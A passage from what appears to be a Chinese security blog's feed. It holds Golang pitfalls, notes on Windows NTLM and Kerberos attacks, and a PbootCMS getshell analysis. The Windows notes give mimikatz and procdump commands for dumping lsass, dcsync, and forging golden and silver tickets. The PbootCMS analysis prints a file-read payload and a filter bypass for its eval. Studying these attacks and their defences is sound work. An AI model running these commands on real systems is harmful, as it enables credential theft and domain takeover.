        protected $maxRetries;


        public function __construct($validator)
{
            $this-&gt;generator = new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
            $this-&gt;validator = $validator;
            $this-&gt;maxRetries = 10;
        }
    }
}


namespace Symfony\Component\Routing{
    class RouteCollection{


    }
}
?&gt;
</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://xz.aliyun.com/t/5483">先知文章-反序列化链1</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Golang踩坑集锦]]></title>
        <id>https://chriskalix.github.io/post/DRstRdo9d/</id>
        <link href="https://chriskalix.github.io/post/DRstRdo9d/">
        </link>
        <updated>2020-06-21T13:47:26.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>写<code>Golang</code>踩了一些坑，大部分的坑都是比较睿智的。因为不想看视频文档之类的，基础语法学了就上路了，有点磕磕绊绊，记录一下踩到的坑，防止反复地踩。总之，不断更新记录吧。</p>
</blockquote>
<h2 id="gin框架">Gin框架</h2>
<blockquote>
<p>由于开始都说抄的，所以如果正经的跟一遍下来是不会有问题的...</p>
</blockquote>
<p>c.Next()和c.Abort()，这两个只在Middleware里用，涉及到Handler调用，明天找个文章填上</p>
<h2 id="变量申明以及作用域">变量申明以及作用域</h2>
<blockquote>
<p>起因，写了一个channel，明明是非阻塞的啊，结果阻塞了，具体如下</p>
</blockquote>
<pre><code class="language-go">package xxx

var ipch chan string
func a() {
	ipch := make(chan string, 10000)
	xxx
	go b()
}

func b() {
	ipch &lt;- &quot;test&quot;
}

</code></pre>
<p>当时那叫一个纳闷，想不明白为什么<code>ipch &lt;- &quot;test&quot;</code>就阻塞了，没办法把chan写到a函数内部去，然后当参数传给b（也不是不行）。还是纳闷，于是去搜一下，发现有人踩过坑了（<a href="https://www.cnblogs.com/sevenyuan/p/4544434.html">文章</a>）。<br>
其实就是变量和作用域的问题，用 := 相当于另外申明，去了<code>:</code> 就行了 （...原来这么睿智）</p>
<p>还有一个情况，有点坑了<br>
比如我在外面定义了数据库</p>
<p>var db *sql.DB</p>
<p>同时有个init函数</p>
<pre><code class="language-go">func init {
    db, err := sql.Open(xxx)
    if err!=nil {
        xxxx
    }
}
</code></pre>
<p>这时候其实db被申明成了内部变量，我的解决方法就是，var err error，然后在申明处就用<code>db,err = sql.Open(xxx)</code>，坑啊....</p>
<h2 id="动态调用">动态调用</h2>
<p>一直以为应该能有一个类似于<code>php</code>中<code>call_user_func</code>的函数，直接根据函数名调用。昨晚(20200621)看到了凌晨2点，在<code>stackoverflow</code>上找到一个老兄的回答，说是只能自定一个map，然后用reflect函数做个动态调用的。哭了，我以为只能直接的。</p>
<h2 id="不知名小坑集合">不知名小坑集合</h2>
<ol>
<li>
<p><code>time.Sleep(1 * time.Second)</code>可以，但是定义一个<code>int a</code>，然后<code>time.Sleep(a * time.Second)</code>就会报错，这是因为俩类型不一样，改成<code>time.Sleep(time.Duration(a) * time.Second)</code>就可以</p>
</li>
<li>
<p>循环发送udp，发到1000个左右的时候就报错 <code>bad file description</code>，<code>fd</code>相关的错误。看了一下<code>ulimit</code>的都没什么问题。查阅后发现，是因为我写的时候调用了<code>syscall.send</code>，打开了<code>fd</code>，但是没有调用<code>syscall.Close(fd)</code>导致堆积阻塞，出现这一问题的原因是我以为函数return后，应该会自动回收<code>fd</code>，然而事实不是这样的（这个应该算是<code>Linux</code>编程问题吧）</p>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows认证&Kerberos&常见攻击]]></title>
        <id>https://chriskalix.github.io/post/SXS4qCdRk/</id>
        <link href="https://chriskalix.github.io/post/SXS4qCdRk/">
        </link>
        <updated>2020-06-17T06:58:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-windows本地认证">1. Windows本地认证</h2>
<ul>
<li>路径：<code>%SystemRoot%\system32\config\sam</code></li>
<li>当我们登录系统的时候，系统会自动读取SAM文件中的&quot;密码&quot;与输入密码进行对比</li>
</ul>
<h3 id="ntlm-hash-nt-lan-manager"><strong>NTLM Hash</strong> (NT LAN Manager)</h3>
<ul>
<li>NTLM Hash是支持Net NTLM认证协议以及本地认证过程中的一个重要参与物，长度为32，由数字与字母组成。</li>
<li>Windows本身不存储用户明文密码，它会将用户的明文经过加密算法后存储在SAM数据库中</li>
<li>当用户登录时，明文也会加密成NTLM Hash，与SAM密码进行对比。NTLM Hash的前身是LM Hash，目前基本淘汰了（<strong>Windows Server 2008以前的系统还会用</strong>），但是依然存在</li>
</ul>
<p>NTLM Hash的产生：<br>
<code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
<p>LM Hash的产生：<br>
小写转大写 -&gt; 转化为16进制分成2组，填充为14个字符 -&gt; 分成两组7字节的块 -&gt; 每组转化为比特流，不足56Bit在左边加0 -&gt; 将比特流按7比特一组，分出8组，末尾加0</p>
<h3 id="本地认证流程图">本地认证流程图</h3>
<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1592410797128.png" alt="" loading="lazy"></figure>
<h2 id="2-windows网络认证-中间人攻击还没搞懂">2. Windows网络认证 - 中间人攻击还没搞懂</h2>
<p>常见服务： SMB服务（端口445）</p>
<h3 id="ntlm协议">NTLM协议</h3>
<blockquote>
<p>早期SMB协议明文传输。后来出现LM协议（Challenge/Response机制），到后来的NTLM机制，现在以及更新了NTLMv2以及Kerberos(域环境下)验证体系</p>
</blockquote>
<h4 id="挑战响应机制">挑战/响应机制</h4>
<ol>
<li>协商（确认协议版本）</li>
<li>质询
<ul>
<li>客户端向服务器端发送用户信息（用户名）请求</li>
<li>服务器接受到请求，生成一个16位的随机数，被称为&quot;Challenge&quot;，使用用户名对应的NTLM Hash机密Challenge（16位随机字符），生成Chanllenge1。同时，生成Challenge1后，将Challenge1发送给客户端。 // Net NTLM Hash = NTLM Hash(Challenge)</li>
<li>客户端接受到Chanllege后，同样的方式进行加密，返回Response</li>
<li>服务器端进行对比认证</li>
</ul>
</li>
</ol>
<p>流程图：<br>
<img src="https://chriskalix.github.io/post-images/1592410807643.png" alt="" loading="lazy"></p>
<h3 id="ntlm-v2协议">NTLM v2协议</h3>
<p>区别点：</p>
<ul>
<li>NTLM v1和v2的区别就是Changllenge与加密算法不同，但用的都是NTLM Hash作为原料</li>
<li>v1的Challenge 8位，v2为16位</li>
<li>v1加密算法是Des，v2是HMAC-MD5</li>
</ul>
<p><strong>工具</strong>：<br>
<code>Responder</code> | <code>smbexec</code> | <code>Inveigh</code></p>
<h2 id="3-pthpass-the-hash哈希传递">3. <strong>PTH</strong>(Pass the hash)哈希传递</h2>
<blockquote>
<p>内网渗透中，经常需要抓取管理员密码，NTLM Hash，尤其是在域环境下，能帮助我们扩大战果</p>
</blockquote>
<ul>
<li>什么是PTH<br>
是一个不需要账户明文密码就能完成认证的一个技术</li>
<li>作用<br>
获取不到密码，破解不了NTLM Hash又想要扩大战果的问题</li>
</ul>
<h3 id="必要条件">必要条件</h3>
<ol>
<li>网络互达</li>
<li>需要用户名</li>
<li>需要NTLM Hash</li>
</ol>
<p>问：为什么需要用户名?<br>
答：NTLM协议需要用户名，服务端需要用户名然后去读取</p>
<h3 id="工具">工具</h3>
<p><code>Smbmap</code> | <code>CrackMapExec</code> |  <code>Smbexec</code> | <code>Metasploit</code></p>
<h3 id="相关问题">相关问题</h3>
<p>如何使用 NTLMv1/v2（或者不常用的netNTLM）哈希进行传递哈希攻击？ @leesoh 坑人的问题，这些哈希都不能传递:&gt;</p>
<h3 id="对应pth的手法问题">对应PTH的手法&amp;问题</h3>
<p>对应手法：</p>
<pre><code>LAPS
</code></pre>
<p>kb2871997：</p>
<pre><code>内容 : 禁止本地管理员账户用于远程连接，这样就无法以本地管理员用户的权限执行wmi、PSEXEC、schtasks、at和访问文件共享
这个补丁发布后常规的Pass The Hash已经无法成功，唯独默认的 Administrator (SID 500)账号例外，利用这个账号仍可以进行Pass The Hash远程连接
</code></pre>
<h2 id="4-kerberos认证机制非常重点">4. <strong>Kerberos认证机制</strong>(非常重点)</h2>
<blockquote>
<p>Kerberos是一种网络认证协议，不基于主机安全</p>
</blockquote>
<h3 id="域认证所有角色">域认证所有角色</h3>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Centor) = DC</li>
</ul>
<h3 id="详细流程图">详细流程图</h3>
<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1592410833529.png" alt="" loading="lazy"></figure>
<h2 id="5-pttpass-the-ticket攻击">5. PTT(Pass The Ticket)攻击</h2>
<blockquote>
<p>在了解完上述Kerberos后，这边自然地引申出PTT攻击（票据传递攻击）</p>
</blockquote>
<h3 id="golden-ticket-黄金票据">Golden Ticket (黄金票据)</h3>
<blockquote>
<p>该票据的利用条件是原先已成功取得域用户的HASH，尤其是krbtgt这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
</blockquote>
<p>利用krbtgt的HASH值可以伪造生成任意的TGT,能够绕过对任意用户的账号策略，能够让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
<h4 id="前提条件">前提条件</h4>
<p>域名称<br>
域SID<br>
域krbtgt的hash（意味着你已经有域控权限）<br>
伪造的用户名（任意用户或者不存在的用户）</p>
<h4 id="操作步骤">操作步骤</h4>
<blockquote>
<p>使用工具<code>mimikatz</code>(落地有杀软的话基本是杀的死死的，需要找个免杀版本)</p>
</blockquote>
<pre><code class="language-txt">还看到了用procdump.exe的，拖完拉到本地做
procdump64.exe -accepteula -ma lsass.exe 存放路径\文件名
mimikatz # sekurlsa::minidump 文件名
mimikatz # sekurlsa::logonPasswords full
</code></pre>
<p>Mimikatz的操作：</p>
<ol>
<li>提取域用户krbtgt的NTLM Hash<br>
<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code></li>
<li>查看域内所有用户的hash<br>
<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></li>
<li>获取域sid<br>
<code>whoami /all</code></li>
<li>生成黄金票据<br>
方法一：用AES256生成<br>
<code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
方法二：用NTLM Hash<br>
<code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code><br>
在倾旋的视频里是：<br>
<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></li>
</ol>
<h4 id="防御">防御</h4>
<ol>
<li>经常更换KRBTGT密码</li>
<li>不允许域管账户登录其他服务器</li>
</ol>
<p>Msf的操作：<br>
用<code>golden_ticket_create</code>生成，在<code>meterpreter</code>里。使用的时候使用kerberos_ticket_use</p>
<h3 id="silver-ticket白银票据">Silver Ticket(白银票据)</h3>
<blockquote>
<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信。这篇<a href="https://www.cnblogs.com/backlion/p/8119013.html">文章</a>挺好的</p>
</blockquote>
<h4 id="白银票据特点">白银票据特点</h4>
<ol>
<li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名</li>
<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务</li>
<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
<li>攻击者需要服务帐户密码哈希值</li>
<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过</li>
<li>任何事件日志都在目标服务器上</li>
</ol>
<h4 id="前提条件-2">前提条件</h4>
<p>域名称<br>
域的SID<br>
域中Server服务器账户的NTLM-Hash<br>
伪造任意的用户名</p>
<h4 id="操作步骤-2">操作步骤</h4>
<blockquote>
<p>同样的，老朋友Mimiktaz了</p>
</blockquote>
<p>Mimikatz:</p>
<ul>
<li>kerberos::list  查看票据</li>
<li>kerberos::purge 清楚票据</li>
</ul>
<ol>
<li>导出hash<br>
mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;<br>
或者 mimiktaz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt</li>
<li>生成Sliver Ticket<pre><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型}  /rc4:{NTLM Hash}  /user:{用户名} /ptt&quot; exit
Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大
</code></pre>
还有一些其他的服务
<table>
<thead>
<tr>
<th style="text-align:right">务名称</th>
<th style="text-align:center">需要的服务</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right">MI</td>
<td style="text-align:center">HOST、RPCSS</td>
</tr>
<tr>
<td style="text-align:right">owerShell Remoting</td>
<td style="text-align:center">HOST、HTTP</td>
</tr>
<tr>
<td style="text-align:right">inRM</td>
<td style="text-align:center">HOST、HTTP</td>
</tr>
<tr>
<td style="text-align:right">cheduled Tasks</td>
<td style="text-align:center">HOST</td>
</tr>
<tr>
<td style="text-align:right">indows File Share</td>
<td style="text-align:center">CIFS</td>
</tr>
<tr>
<td style="text-align:right">DAP、<strong>DCSync</strong></td>
<td style="text-align:center">LDAP</td>
</tr>
<tr>
<td style="text-align:right">indows Remote Server</td>
<td style="text-align:center">RPCSS、LDAP、CIFS</td>
</tr>
</tbody>
</table>
</li>
</ol>
<h4 id="针对白银票据的防御">针对白银票据的防御</h4>
<p>开启PAC特权属性证书保护功能，PAC即是在步骤五收到了请求后，认证Client端发来的PAC(Privileged Attribute Certificate)。开启方式：将注册表中<code>HKEY_LOCAL\MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code>中的<code>ValidateKdcPacSignature</code>设置为1</p>
<h2 id="6-windows-access-token简介">6. Windows Access Token简介</h2>
<blockquote>
<p>Windows Token其实叫Access Token(访问令牌)，它是一个描述进程或者线程安全上下文的一个对象。不同用户登录计算机后，都会生成一个Access Token，这个Token在用户创建进程或者线程的时候会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限</p>
</blockquote>
<ul>
<li>一般情况下，用户双击运行一个程序，都会拷贝 &quot;explorer.exe&quot;的<code>Access Token</code>（问题：explorer.exe）</li>
<li>Access Token一般分为主令牌和模拟令牌</li>
<li><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除</strong></li>
</ul>
<h3 id="windows-access-token产生过程">Windows Access Token产生过程</h3>
<p>每个进程创建时都会根据登录绘画权限，由LSA（Local Security Authority）分配一个Token（如果CreateProcess时指定了Token，则会使用该Token，否则用父进程的Token拷贝）</p>
<h3 id="windows-access-token令牌假冒实战">Windows Access Token令牌假冒实战</h3>
<ul>
<li>Incognito(在Metasploit下集成，在meterpreter中直接load进来)<br>
list_tokens -u<br>
impersonate_token &quot;xxx\xxx&quot;</li>
<li>Powershell - Invoke - TokenManipulation.ps1</li>
<li>Cobalt Strike - steal_token</li>
</ul>
<h3 id="防御-2">防御</h3>
<p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从而控制DC。想要清楚假冒，重启即可</p>
<h2 id="7-扩展">7. 扩展</h2>
<p>SPN扫描(20200618等待扩展ing)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Pbootcms v2.0.7 Getshell分析]]></title>
        <id>https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/pbootcms-v207-getshell-fen-xi/">
        </link>
        <updated>2020-06-14T04:50:43.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>前言: 上个月团队中的奶权审计了PbootCMS，里面一些细节还是挺有意思的，于是跟风(跟着他的文章)，一起看一看。</p>
</blockquote>
<h2 id="分析">分析</h2>
<h3 id="后台任意文件读取">后台任意文件读取</h3>
<p><code>apps/admin/controller/system/UpgradeController.php</code>下的update函数，下面为触发点相关代码</p>
<pre><code class="language-php">public function update()
{
    if ($_POST) {
        if (! ! $list = post('list')) {
            $list = explode(',', $list);
            $backdir = date('YmdHis');
            // 分离文件
            foreach ($list as $value) {
                // 过滤掉相对路径
                $value = preg_replace('/\.\.(\/|\\\)/', '', $value);
                if (stripos($value, '/script/') !== false) {
                    $sqls[] = $value;
                }
            ...
            // 更新数据库
            if (isset($sqls)) {
                $db = new DatabaseController();
                switch (get_db_type()) {
                    case 'sqlite':
                        copy(DOC_PATH . $this-&gt;config('database.dbname'), DOC_PATH . STATIC_DIR . '/backup/sql/' . date('YmdHis') . '_' . basename($this-&gt;config('database.dbname')));
                        break;
                    case 'mysql':
                        $db-&gt;backupDB();
                        break;
                }
                sort($sqls); // 排序
                foreach ($sqls as $value) {
                    $path = RUN_PATH . '/upgrade' . $value;
                    if (file_exists($path)) {
                        $sql = file_get_contents($path);
                        if (! $this-&gt;upsql($sql)) {
                            $this-&gt;log(&quot;数据库 $value 更新失败!&quot;);
                            json(0, &quot;数据库&quot; . basename($value) . &quot; 更新失败！&quot;);
                        }
                    } else {
                        json(0, &quot;数据库文件&quot; . basename($value) . &quot;不存在！&quot;);
                    }
                }
            }
            ...
}
</code></pre>
<p>在注释<code>更新数据库</code>下，关键函数<code>file_get_contents</code>。遍历<code>$sqls</code>变量，读取文件。其中<code>$sqls</code>变量由POST传递，需要包含<code>/script/</code>才能够被赋值<br>
跟进看一下<code>upsql($sql)</code>函数</p>
<pre><code class="language-php">private function upsql($sql)
{
    $sql = explode(';', $sql);
    $model = new Model();
    foreach ($sql as $value) {
        $value = trim($value);
        if ($value) {
            $model-&gt;amd($value);
        }
    }
    return true;
}
</code></pre>
<p><code>$sql</code>参数传入，调用Model类下的amd方法，继续跟进，在<code>/core/database/Sqlite.php</code>下找到函数，如下</p>
<pre><code class="language-php">public function amd($sql)
{
    $result = $this-&gt;query($sql, 'master');
    if ($result) {
        return $result;
    } else {
        return 0;
    }
}
</code></pre>
<p>跟进看query方法</p>
<pre><code class="language-php">public function query($sql, $type = 'master')
{
    $time_s = microtime(true);
    if (! $this-&gt;master || ! $this-&gt;slave) {
        $cfg = ROOT_PATH . Config::get('database.dbname');
        $conn = $this-&gt;conn($cfg);
        $this-&gt;master = $conn;
        $this-&gt;slave = $conn;
    }
    switch ($type) {
        case 'master':
            if (! $this-&gt;begin) { // 存在写入时自动开启显式事务，提高写入性能
                $this-&gt;master-&gt;exec('begin;');
                $this-&gt;begin = true;
            }
            $result = $this-&gt;master-&gt;exec($sql) or $this-&gt;error($sql, 'master');
            break;
        case 'slave':
            $result = $this-&gt;slave-&gt;query($sql) or $this-&gt;error($sql, 'slave');
            break;
    }
    return $result;
}
</code></pre>
<p>跟进error方法</p>
<pre><code class="language-php">protected function error($sql, $conn)
    {
        $err = '错误：' . $this-&gt;$conn-&gt;lastErrorMsg() . '，';
        if ($this-&gt;begin) { // 存在显式开启事务时进行回滚
            $this-&gt;master-&gt;exec('rollback;');
            $this-&gt;begin = false;
        }
        error('执行SQL发生错误！' . $err . '语句：' . $sql);
    }
}
</code></pre>
<p>可以看到error最终会被展示出来。最终的payload为(只支持windows下)</p>
<pre><code class="language-txt">URL: http://pbootcms/admin.php?p=/Upgrade/update
POST: list=/script/../../../config/database.php
</code></pre>
<p>这边有一个小trick，windows下支持不存在的路径上跳，而linux下是支持的</p>
<p>再回头看一下上面的判断条件</p>
<pre><code class="language-php">if (stripos($value, '/script/') !== false)
</code></pre>
<p>可以看到只要有<code>/script/</code>出现即可，所以需要在linux下找到相关目录(好像没有固定的，所以还是在windows下比较适用)</p>
<h3 id="模板注入">模板注入</h3>
<p>这边用到的trick在之前的文章中有过整理，所以简单地过一下先。同样想法和思路是先追溯敏感函数，其中找到eval在<code>apps/home/controller/ParseController.php</code>下，找到具体函数，部分代码如下所示：</p>
<pre><code class="language-php">public function parserIfLabel($content)
{
    $pattern = '/\{pboot:if\(([^}^\$]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
    $pattern2 = '/pboot:([0-9])+if/';
    if (preg_match_all($pattern, $content, $matches)) {
        $count = count($matches[0]);
        for ($i = 0; $i &lt; $count; $i ++) {
            $flag = '';
            $out_html = '';
            $danger = false;
            
            $white_fun = array(
                'date',
                'in_array',
                'explode',
                'implode'
            );
            
            // 还原可能包含的保留内容，避免判断失效
            $matches[1][$i] = $this-&gt;restorePreLabel($matches[1][$i]);
            
            // 解码条件字符串
            $matches[1][$i] = decode_string($matches[1][$i]);
            
            // 带有函数的条件语句进行安全校验
            if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)) {
                foreach ($matches2[1] as $value) {
                    if ((function_exists($value) || preg_match('/^eval$/i', $value)) &amp;&amp; ! in_array($value, $white_fun)) {
                        $danger = true;
                        break;
                    }
                }
            }
            
            // 过滤特殊字符串
            if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i', $matches[1][$i])) {
                $danger = true;
            }
            
            // 如果有危险函数，则不解析该IF
            if ($danger) {
                continue;
            }
            
            eval('if(' . $matches[1][$i] . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}');
            ...
</code></pre>
<p>作者提到了两种方法，一为上传图片马再通过<code>include()</code>函数包含，第二就是下面提到的简单一些的通用方法。<br>
跟着代码读一下，其实就是将传入的模板进行过滤，过滤掉特殊字符串。在我整理的PHP后门那个文章中提到了这个的绕过方法。这里的具体应用即为使用<code>chr%01(xxx)</code>这种形式(即函数+控制字符+参数)的形式绕过。</p>
]]></content>
    </entry>
</feed>